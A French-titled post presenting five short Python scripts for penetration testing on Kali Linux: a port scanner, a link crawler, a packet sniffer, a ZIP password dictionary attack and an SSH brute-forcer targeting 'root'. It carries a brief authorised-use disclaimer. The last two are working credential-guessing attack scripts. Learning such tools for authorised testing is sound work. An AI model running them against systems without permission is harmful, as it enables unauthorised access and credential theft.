# Quelques scripts Python utiles pour la cybersécurité que vous pouvez utiliser sur Kali Linux :
- Ces scripts doivent être utilisés de manière éthique et légale, toujours avec l'autorisation des propriétaires des systèmes que vous testez.
### 1. **Port Scanner**
```python
import socket

def port_scan(ip, start_port, end_port):
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"Port {port}: Open")
        sock.close()

ip = '127.0.0.1'  # Change this to the target IP
start_port = 1
end_port = 1024

port_scan(ip, start_port, end_port)
```

### 2. **Simple Web Crawler**
```python
import requests
from bs4 import BeautifulSoup

def web_crawler(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        for link in soup.find_all('a'):
            href = link.get('href')
            if href and href.startswith('http'):
                print(href)
    except requests.exceptions.RequestException as e:
        print(e)

url = 'http://example.com'  # Change this to the target URL
web_crawler(url)
```

### 3. **Password Cracker (Brute Force)**
```python
import zipfile

def extract_zip(zip_file, password):
    try:
        zip_file.extractall(pwd=password.encode())
        print(f"Password found: {password}")
        return True
    except:
        return False

zip_file = zipfile.ZipFile('protected.zip')  # Change this to the target ZIP file

with open('passwords.txt', 'r') as file:  # Change this to your password list
    for line in file.readlines():
        password = line.strip()
        if extract_zip(zip_file, password):
            break
```

### 4. **Network Sniffer**
```python
import socket

def sniff_packets():
    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    while True:
        raw_data, addr = conn.recvfrom(65536)
        print(f"Packet received from {addr}")

sniff_packets()
```

### 5. **SSH Brute Force**
```python
import paramiko

def ssh_brute_force(target_ip, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(target_ip, username=username, password=password)
            print(f"Password found: {password}")
            return
        except paramiko.AuthenticationException:
            continue

target_ip = '192.168.1.1'  # Change this to the target IP
username = 'root'  # Change this to the target username
password_list = ['password1', 'password2', 'password3']  # Add more passwords to the list

ssh_brute_force(target_ip, username, password_list)
```

